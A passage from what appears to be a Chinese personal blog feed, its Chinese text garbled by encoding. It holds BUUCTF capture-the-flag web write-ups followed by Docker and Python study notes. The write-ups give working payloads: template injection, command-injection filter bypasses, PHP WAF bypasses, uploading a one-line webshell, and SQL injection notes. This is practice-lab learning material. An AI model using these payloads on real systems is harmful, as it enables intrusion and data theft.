·ã€‚</p><p>æ€€ç–‘è¿™ä¸ªfilehashå°±æ˜¯é€šè¿‡è¿™ä¸ªå…¬å¼ç®—å‡ºæ¥çš„ï¼Œç»“åˆflag.txtä¸­çš„æç¤ºï¼Œå†æ¬¡åˆç†æ€€ç–‘æˆ‘ä»¬é€šè¿‡æ–‡ä»¶åï¼ˆ/fllllllllllllagï¼‰å¹¶æŒ‰ç…§è¿™ä¸ªå…¬å¼è®¡ç®—å‡ºå¯¹åº”æ­£ç¡®çš„filehashï¼Œå¹¶ä¸”æŒ‰ç…§è¿™ç§æ ¼å¼è®¿é—®urlï¼Œå°±å¯ä»¥å¾—åˆ°flagã€‚</p><p>ç°åœ¨ï¼Œæˆ‘ä»¬æ–‡ä»¶åçŸ¥é“ï¼Œmd5å‡½æ•°å¯ä»¥è°ƒç”¨ï¼Œä½†æ˜¯ç¼ºå°‘äº†cookie_secret</p><p>è¿™æ—¶å€™å›åˆ°ä¹‹å‰çš„renderæ¨¡æ¿æ³¨å…¥</p><p>æ¥åˆ°flag.txté¡µé¢ï¼Œä¿®æ”¹è·¯å¾„</p><p><img src="/2021/05/12/buu/0/image-20210513195413293.png" alt="image-20210513195413293"></p><p>å‡ºç°äº†error</p><p>ä¸Šæ–¹?msg=error,è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹å‚æ•°å€¼çœ‹çœ‹æœ‰ä»€ä¹ˆå˜åŒ–</p><p><img src="/2021/05/12/buu/0/image-20210513195530008.png" alt="image-20210513195530008"></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™é‡Œåˆ‡å…¥ï¼Œå°†æ­¤ä½œä¸ºæ³¨å…¥ç‚¹ã€‚</p><p><img src="/2021/05/12/buu/0/image-20210513195745573.png" alt="image-20210513195745573"></p><p>é€šè¿‡æ¨¡æ¿æ³¨å…¥ï¼Œå¾—åˆ°äº†ç¯å¢ƒå˜é‡ï¼Œå†…å«æœ‰cookie_secretï¼š750fc3c7-cfc4-4f0b-9000-76f4ed4c08ebï¼ˆåŠ¨æ€ï¼‰</p><p>æŸ¥åˆ°äº†ä¸€ä¸ªå¤§ä½¬çš„åšå®¢å†™çš„pythonè„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5value(s):</span><br><span class="line">    md5 &#x3D; hashlib.md5() </span><br><span class="line">    md5.update(s) </span><br><span class="line">    return md5.hexdigest()</span><br><span class="line"></span><br><span class="line">def jiami(): </span><br><span class="line">    filename &#x3D; &#39;&#x2F;fllllllllllllag&#39;</span><br><span class="line">    cookie_s &#x3D;&quot;750fc3c7-cfc4-4f0b-9000-76f4ed4c08eb&quot;</span><br><span class="line">    print(md5value(filename.encode(&#39;utf-8&#39;)))</span><br><span class="line">    x&#x3D;md5value(filename.encode(&#39;utf-8&#39;))</span><br><span class="line">    y&#x3D;cookie_s+x</span><br><span class="line">    print(md5value(y.encode(&#39;utf-8&#39;)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jiami()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><p>å“ˆå¸Œå€¼ï¼š550e8b57a2f7c087a5792aa9be8a7461</p><p>æ¥ç€æ„é€ payloadï¼š</p><p><a href="http://bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn/file?filename=/fllllllllllllag&filehash=550e8b57a2f7c087a5792aa9be8a7461">bd69b4c9-dcb8-4ff9-b3cc-25daaf4346d5.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=550e8b57a2f7c087a5792aa9be8a7461</a></p><p><img src="/2021/05/12/buu/0/image-20210513200252696.png" alt="image-20210513200252696"></p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p><img src="/2021/05/12/buu/0/image-20210513230333771.png" alt="image-20210513230333771"></p><p>æ‰“å¼€é¶æœºåå¦‚å›¾</p><p>ä¼ å‚?ip=127.0.0.1</p><p><img src="/2021/05/12/buu/0/image-20210513230557224.png" alt="image-20210513230557224"></p><p>ç»“æœä¸æ˜¯ä¸ä¹‹å‰åšçš„ä¸€æ ·ç®€å•ï¼Œæœ‰äº†å¯¹æŒ‡ä»¤çš„è¿‡æ»¤ï¼ˆè¢«å˜²è®½äº†ï¼‰</p><p><img src="/2021/05/12/buu/0/image-20210513230623071.png" alt="image-20210513230623071"></p><p>çŒœæµ‹åº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ï¼Œå› ä¸ºå°è¯•äº†ä¹‹å‰çš„| ã€||ç­‰éƒ½ä¸è¡Œ</p><p>æŸ¥äº†åšå®¢ï¼Œç›¸å…³èµ„æ–™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">åˆ¤æ–­ç›®æ ‡ç½‘ç«™æ˜¯å¯¹ç©ºæ ¼è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›æ–¹æ³•ä»£æ›¿ç©ºæ ¼æ¥èµ·åˆ°åˆ†å‰²ä½œç”¨</span><br><span class="line"></span><br><span class="line">æ³¨ï¼š%20(space)ã€%09(tab)ã€$IFS$9ã€$&#123;IFS&#125;$9ã€ &#123;IFS&#125;ã€IFS éƒ½å¯ä»¥</span><br><span class="line"></span><br><span class="line">ä½†è¿™é‡Œå­˜åœ¨ä¸€äº›è¿‡æ»¤&#123;IPS&#125;å¤±æ•ˆï¼Œå¤šæ¬¡å°è¯•$IFS$9å¯ä»¥ ï¼ˆå…·ä½“å¯ä»¥æŸ¥çœ‹index.phpæ–‡ä»¶ä¸­çš„è¿‡æ»¤è§„åˆ™ï¼‰</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„é€ äº†?ip=127.0.0.1;cat$IFS$1flag.php</p><p>è¿˜æ˜¯ã€‚ã€‚ã€‚</p><p><img src="/2021/05/12/buu/0/image-20210513231027253.png" alt="image-20210513231027253"></p><p>å¥½å§ï¼Œè²Œä¼¼flagä¹Ÿè¢«è¿‡æ»¤äº†</p><p>é‚£ä¹ˆæˆ‘ä»¬å…ˆçœ‹ä¸‹è¿˜æœ‰index.php</p><p><img src="/2021/05/12/buu/0/image-20210513231122334.png" alt="image-20210513231122334"></p><p>å¾—åˆ°äº†æºä»£ç ï¼Œæœç„¶ä¸€å¤§å †æ­£åˆ™åŒ¹é…ï¼Œè¿‡æ»¤äº†è®¸å¤šæŸ¥è¯¢æŒ‡ä»¤å’Œflagå­—æ ·ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¾—æƒ³åŠæ³•ç»•è¿‡</p><p>è¿™é‡Œæˆ‘ç”¨äº†å¤§ä½¬åšå®¢çš„ä¸€ç§æ–¹æ³•ï¼Œæ‹¼æ¥æ³•</p><p><img src="/2021/05/12/buu/0/image-20210513231549694.png" alt="image-20210513231549694"></p><p><img src="/2021/05/12/buu/0/image-20210513231603829.png" alt="image-20210513231603829"></p><p>å‚ç…§åšå®¢ï¼š<a href="https://blog.csdn.net/xiayu729100940/article/details/105048826">https://blog.csdn.net/xiayu729100940/article/details/105048826</a></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>æ‰“å¼€åå°è¯•äº†å¤šæ¬¡è®¡ç®—å™¨åº”è¯¥åªæœ‰ç®€å•è®¡ç®—åŠŸèƒ½</p><p>ä¸æ˜¯ä»€ä¹ˆsqlæ³¨å…¥ï¼Œæ‰€ä»¥æŸ¥çœ‹æºç </p><p><img src="/2021/05/12/buu/0/image-20210517163046028.png" alt="image-20210517163046028"></p><p>å¾—åˆ°æç¤º  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:&quot;calc.php?num&#x3D;&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br></pre></td></tr></table></figure><p>hackbarèµ°èµ·</p><p><img src="/2021/05/12/buu/0/image-20210517163339301.png" alt="image-20210517163339301"></p><p>å‘ç°æºä»£ç ï¼Œæœ‰å­˜åœ¨è¿‡æ»¤</p><p><img src="/2021/05/12/buu/0/image-20210517163514707.png" alt="image-20210517163514707"></p><p>å¯¹æ•°å­—ä¸æ„Ÿå†’ï¼Œä½†æ˜¯ä¸€å¢åŠ å­—æ¯å°±æ— æ³•è®¿é—®ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡</p><p>æŸ¥äº†wp[BUUCTF | <a href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">RoarCTF 2019]Easy Calc - !ao!ao - åšå®¢å›­ (cnblogs.com)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--$(&quot;#content&quot;).val() æ˜¯ä»€ä¹ˆæ„æ€ï¼š--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--è·å–idä¸ºcontentçš„HTMLæ ‡ç­¾å…ƒç´ çš„å€¼,æ˜¯JQuery,   (&quot;#content&quot;)ç›¸å½“äºdocument.getElementById(&quot;content&quot;);(&quot;#content&quot;)ç›¸å½“äºdocument.getElementById(&quot;content&quot;);(&quot;#content&quot;).val()ç›¸å½“äº document.getElementById(&quot;content&quot;).value;--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--ä½†æ˜¯æ— è®ºæ€ä¹ˆæ³¨å…¥éƒ½æ˜¯400,403å’Œ500ï¼Œè¿™é‡Œç”¨çš„æ˜¯ä¸€ä¸ªæ–°çš„ç‚¹ï¼šPHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§--&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;1;var_dump(scandir(chr(47))) </span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆè¿›è¡ŒæŸ¥è¯¢ï¼Œæ³¨æ„è¿™è¾¹numå‰åŠ ç©ºæ ¼ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p><p>å¤§ä½¬çš„ç†è§£ï¼š[(3æ¡æ¶ˆæ¯) <a href="https://blog.csdn.net/weixin_44077544/article/details/102630714">RoarCTF 2019]Easy Calc_æ²ç›®çš„åšå®¢-CSDNåšå®¢</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--å‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼š--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php?num &#x3D; aaaa   &#x2F;&#x2F;æ˜¾ç¤ºéæ³•è¾“å…¥çš„è¯--&gt;</span><br><span class="line">&lt;!--1--&gt;</span><br><span class="line">&lt;!--é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼š--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php? num &#x3D; aaaa--&gt;</span><br><span class="line">&lt;!--1--&gt;</span><br><span class="line">&lt;!--è¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚--&gt;</span><br></pre></td></tr></table></figure><p>æˆåŠŸæŸ¥è¯¢<img src="/2021/05/12/buu/0/image-20210517164118854.png" alt="image-20210517164118854"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ payloadäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¿˜ä¸å¤ªç†è§£ï¼Œä¸è¿‡åº”è¯¥æ˜¯è°ƒç”¨å‡½æ•°å†ASCIIç </p><p>å¾—åˆ°flag</p><p><img src="/2021/05/12/buu/0/image-20210517164258180.png" alt="image-20210517164258180"></p><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>ä¸¤é¢˜payloadå·®ä¸å¤šï¼Œéƒ½æ˜¯ç”¨phtmlæ–‡ä»¶é¥¶è¿‡ï¼ŒæˆåŠŸä¸Šä¼ ä¸€å¥è¯æœ¨é©¬å</p><p>èšå‰‘è¿æ¥</p><p>æœ€å è™šæ‹Ÿç»ˆç«¯ï¼šcat \flag</p><p><img src="/2021/05/12/buu/0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(275).png"></p><p><img src="/2021/05/12/buu/0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(274).png"></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>æ‰“å¼€åä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"> $text &#x3D; $_GET[&quot;text&quot;]; </span><br><span class="line"> $file &#x3D; $_GET[&quot;file&quot;]; </span><br><span class="line"> $password &#x3D; $_GET[&quot;password&quot;]; </span><br><span class="line">  if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;  </span><br><span class="line">  echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;                       if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;     </span><br><span class="line">  echo &quot;Not now!&quot;;    </span><br><span class="line">  exit();   &#125;</span><br><span class="line">  else&#123;     include($file); &#x2F;&#x2F;useless.php    </span><br><span class="line">    $password &#x3D; unserialize($password);     </span><br><span class="line">    echo $password;   </span><br><span class="line">    &#125; </span><br><span class="line"> &#125; </span><br><span class="line">else&#123;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line">  ?&gt; </span><br></pre></td></tr></table></figure><p>è¡¥å……çŸ¥è¯†ï¼š</p><p>1.PHP file_get_contents() å‡½æ•°</p><p>æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p><h6 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h6><?php echo file_get_contents("test.txt"); ?><p> </p><p>ä¸Šé¢çš„ä»£ç å°†è¾“å‡ºï¼š</p><p>This is a test file with test text.</p><p>2.unserialize</p><p>ååºåˆ—åŒ–ï¼Œ</p><p><em>unserialize</em>æ˜¯å¯¹å•ä¸€çš„å·²åºåˆ—åŒ–çš„å˜é‡è¿›è¡Œæ“ä½œï¼Œå°†å…¶è½¬æ¢å› PHP çš„å€¼ã€‚</p><p><a href="https://blog.csdn.net/tree_ifconfig/article/details/82766587">https://blog.csdn.net/tree_ifconfig/article/details/82766587</a>  å…³äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><p>3.php://filterç”¨äºè¯»å–æºç  </p><p>   php://inputç”¨äºæ‰§è¡Œphpä»£ç </p><p>4.dataä¼ªåè®®å†™å…¥æ–‡ä»¶</p><p><img src="/2021/05/12/buu/0/1.png" alt="image-20210723204757276"></p><p><img src="/2021/05/12/buu/0/image-20210723204953368.png" alt="image-20210723204953368"></p><h2 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h2><p>è¿™é¢˜sqlä¸ä¹‹å‰ä¸åŒ</p><p>ä¸‡èƒ½å¯†ç ã€è”åˆæŸ¥è¯¢æ³¨å…¥ã€åŒå†™ç­‰éƒ½è¢«è¿‡æ»¤ï¼Œç•™ä¸‹ä½œè€…çš„æ¶è¶£å‘³ï¼šä½ å¯åˆ«è¢«æˆ‘é€®ä½äº†ï¼Œè‡­å¼Ÿå¼Ÿ</p><p><img src="/2021/05/12/buu/0/image-20210719112655637.png" alt="image-20210719112655637"></p><p>æŸ¥äº†ä¸€ä¸‹wpï¼Œäº†è§£åˆ°éœ€è¦ç”¨æŠ¥é”™æ³¨å…¥ã€‚</p><h6 id="æŠ¥é”™æ³¨å…¥ç›¸å…³çŸ¥è¯†ï¼š"><a href="#æŠ¥é”™æ³¨å…¥ç›¸å…³çŸ¥è¯†ï¼š" class="headerlink" title="æŠ¥é”™æ³¨å…¥ç›¸å…³çŸ¥è¯†ï¼š"></a>æŠ¥é”™æ³¨å…¥ç›¸å…³çŸ¥è¯†ï¼š</h6><p>æŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨äº†æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œäººä¸ºåœ°åˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿå‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­ã€‚</p><p>è¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹**<code>xpathè¯­æ³•é”™è¯¯</code>å’Œ<code>concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤</code>**</p><h2 id="ç¾ŠåŸæ¯-2020-EasySer"><a href="#ç¾ŠåŸæ¯-2020-EasySer" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]EasySer"></a>[ç¾ŠåŸæ¯ 2020]EasySer</h2><p><img src="/2021/05/12/buu/0/image-20210811194952750.png" alt="image-20210811194952750"></p><p>å¼€æœºé¡µé¢å</p><p>æŒ‰ç…§wpæç¤ºæŸ¥çœ‹äº†robots.txtåè®®</p><p><img src="/2021/05/12/buu/0/image-20210811195123019.png" alt="image-20210811195123019"></p><p>æç¤ºè®¿é—®star1.php</p><p>è¿›å…¥é¡µé¢ï¼Œå¹¶ä¸”é¡ºæ‰‹æŸ¥çœ‹æºç </p><p><img src="/2021/05/12/buu/0/image-20210811195236481.png" alt="image-20210811195236481"></p><p><img src="/2021/05/12/buu/0/image-20210811195250701.png" alt="image-20210811195250701"></p><p>é¡µé¢ä¸Šä¸€å¥è¯æç¤ºæˆ‘ä»¬ç”¨ä¸å®‰å…¨åè®®ç»•è¿‡ã€‚</p><p>ç„¶åæ˜¯å¸ˆå‚…æ‰¾åˆ°çš„httpåè®®æˆä¸ºçªç ´å£</p><p><img src="/2021/05/12/buu/0/1" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ç‰¹ç‚¹ä½¿å®ƒæ¯”httpsæ¥è¯´ä¸å®‰å…¨</p><p>å¯¹äºé€šä¿¡æ–¹ä¸ä¼šè¿‡å¤šç¡®è®¤</p><p>ä»¥127.0.0.1çš„èº«ä»½è®¿é—®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;star1.php</span><br></pre></td></tr></table></figure><p><img src="/2021/05/12/buu/0/image-20210811200022893.png" alt="image-20210811200022893"></p><p>å¾—åˆ°æºç </p><p>Arjunå·¥å…·</p><p>ç¬¬ä¸€æ¬¡æ— è¯­ï¼Œèšå‰‘è¿æ¥ä¸Šä¹‹åæœ¬æ¥è™šæ‹Ÿç»ˆç«¯ç›´æ¥cat /flagï¼Œç»“æœä¸è¡Œ</p><p>æˆ‘å°±ç›´æ¥å»æ‰¾flag.phpï¼Œç»“æœflagè¢«äººåˆ äº†ï¼Ÿï¼Ÿï¼Ÿç›´æ¥åšè¿™é¢˜wpå¿ƒæƒ…æ²¡æœ‰äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker</title>
      <link href="/2021/04/25/docker/docker/"/>
      <url>/2021/04/25/docker/docker/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%7B%22request_id%22:%22162380439616780269841164%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=162380439616780269841164&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-90483576.first_rank_v2_pc_rank_v29&utm_term=docker&spm=1018.2226.3001.4187">(24æ¡æ¶ˆæ¯) dockerå…¥é—¨(åˆ©ç”¨dockeréƒ¨ç½²webåº”ç”¨)_ä»°æœ›æ˜Ÿç©º-CSDNåšå®¢_dockeréƒ¨ç½²webé¡¹ç›®</a></p><p>è¿™ç¯‡æ–‡ç« ä¸é”™å–”</p><p>2021.6.16æˆåŠŸåœ¨ kali2020 å®‰è£…äº†docker</p><p>å‚è€ƒæ–‡ç« å¦‚ä¸‹ï¼š</p><p><a href="https://www.cnblogs.com/lijingrong/p/13396884.html">kali 2020å®‰è£…docker - pipiqiu - åšå®¢å›­ (cnblogs.com)</a></p><p>å…¶ä¸­ä¸€äº›å‘½ä»¤ï¼š</p><p>æŸ¥çœ‹douckerè¿è¡ŒçŠ¶æ€ï¼ˆä»¥ä¸‹æ˜¾ç¤ºå·²å¯åŠ¨å’Œæœªå¯åŠ¨ï¼‰</p><p><code>sudo systemctl status docker æˆ–è€… sudo service docker status</code></p><p> å¼€å¯å’Œåœæ­¢dockeræœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker æˆ–è€…sudo service docker start</span><br><span class="line">sudo systemctl stop docker æˆ–è€… sudo service docker stop</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python</title>
      <link href="/2021/04/08/python/python-picture/"/>
      <url>/2021/04/08/python/python-picture/</url>
      
        <content type="html"><![CDATA[<h4 id="â€œPythonä¹‹ç¦…â€"><a href="#â€œPythonä¹‹ç¦…â€" class="headerlink" title="â€œPythonä¹‹ç¦…â€"></a>â€œ<strong>Pythonä¹‹ç¦…â€</strong></h4><p>The Zen of Python, by Tim Peters</p><p>Beautiful is better than ugly.<br>Explicit is better than implicit.<br>Simple is better than complex.<br>Complex is better than complicated.<br>Flat is better than nested.<br>Sparse is better than dense.<br>Readability counts.<br>Special cases arenâ€™t special enough to break the rules.<br>Although practicality beats purity.<br>Errors should never pass silently.<br>Unless explicitly silenced.<br>In the face of ambiguity, refuse the temptation to guess.<br>There should be oneâ€“ and preferably only one â€“obvious way to do it.<br>Although that way may not be obvious at first unless youâ€™re Dutch.<br>Now is better than never.<br>Although never is often better than <em>right</em> now.<br>If the implementation is hard to explain, itâ€™s a bad idea.<br>If the implementation is easy to explain, it may be a good idea.<br>Namespaces are one honking great idea â€“ letâ€™s do more of those!   </p><h3 id="pythonå­¦ä¹ "><a href="#pythonå­¦ä¹ " class="headerlink" title="pythonå­¦ä¹ "></a>pythonå­¦ä¹ </h3><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(126).png"></p><p>åœ¨å­—ç¬¦ä¸²ä¸­ä½¿ç”¨å˜é‡</p><p><code>first_name = &quot;ada&quot;</code><br><code>last_name = &quot;lovelace&quot;</code><br><code>full_name = f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</code></p><p>è¦åœ¨å­—ç¬¦ä¸²ä¸­æ’å…¥å˜é‡çš„å€¼ï¼Œå¯åœ¨å¼•å·é¢å‰åŠ ä¸Šå­—æ¯fï¼Œå†å°†è¦æ’å…¥çš„å˜é‡æ”¾åœ¨èŠ±æ‹¬å·å†…ã€‚è¿™æ ·ï¼Œå½“pythonæ˜¾ç¤ºå­—ç¬¦ä¸²æ—¶ï¼Œå°†æŠŠæ¯ä¸ªå˜é‡éƒ½æ›¿æ¢ä¸ºå…¶å€¼ã€‚</p><p>è¿™ç§å­—ç¬¦ä¸²åä¸ºfå­—ç¬¦ä¸²ã€‚fæ˜¯formatæ ¼å¼ï¼ˆè®¾ç½®æ ¼å¼ï¼‰çš„ç®€å†™ï¼Œå› ä¸ºpythoné€šè¿‡æŠŠèŠ±æ‹¬å·å†…çš„å˜é‡æ›¿æ¢ä¸ºå…¶å€¼æ¥è®¾ç½®å­—ç¬¦ä¸²çš„æ ¼å¼ã€‚ä¸Šè¿°è¾“å‡ºçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ada lovace</span><br></pre></td></tr></table></figure><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(127).png"></p><p>last_owned = motorcycles.pop[0],é»˜è®¤æ˜¯å°†æœ€åä¸€ä¸ªå…ƒç´ â€œå¼¹å‡ºæ ˆå…ƒç´ â€</p><p>removeåˆ é™¤ç‰¹å®šå…ƒç´ </p><p>sortè‡ªåŠ¨æ’åº</p><h4 id="å…³äºå¾ªç¯"><a href="#å…³äºå¾ªç¯" class="headerlink" title="å…³äºå¾ªç¯"></a>å…³äºå¾ªç¯</h4><p>å¦‚å®šä¹‰å˜é‡dimension = ï¼ˆ200ï¼Œ50ï¼‰</p><p>ä½¿ç”¨å¾ªç¯æ—¶å´æ˜¯ï¼šfor dimension in dimensions:</p><p>â€‹                               print(dimensions)</p><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(132).png"></p><h4 id="é—²æš‡çš„ä½©å¥‡"><a href="#é—²æš‡çš„ä½©å¥‡" class="headerlink" title="é—²æš‡çš„ä½©å¥‡"></a>é—²æš‡çš„ä½©å¥‡</h4><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(131).png"></p><h4 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h4><p>ä¸€åº¦ä¸­æ–­ï¼Œè²Œä¼¼æ˜¯ä¸ºäº†ä¹‹å‰çš„python2.7.11æ¥æ‰§è¡Œsqlmapï¼Œè¿™æ¬¡å¥½åƒä¸èƒ½åŒæ—¶æ·»åŠ è·¯å¾„ï¼Œä¸ç„¶å°±æŠ¥é”™</p><h4 id="windowsç»ˆç«¯è¿è¡Œpythonç¨‹åº"><a href="#windowsç»ˆç«¯è¿è¡Œpythonç¨‹åº" class="headerlink" title="windowsç»ˆç«¯è¿è¡Œpythonç¨‹åº"></a>windowsç»ˆç«¯è¿è¡Œpythonç¨‹åº</h4><p>å¦‚ä¸‹å›¾æ‰€ç¤ºå—·</p><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(133).png"></p><h4 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h4><p>pythonçš„å¾ªç¯è™½ç„¶æ²¡æœ‰åƒcè¯­è¨€ä¸€æ ·æ 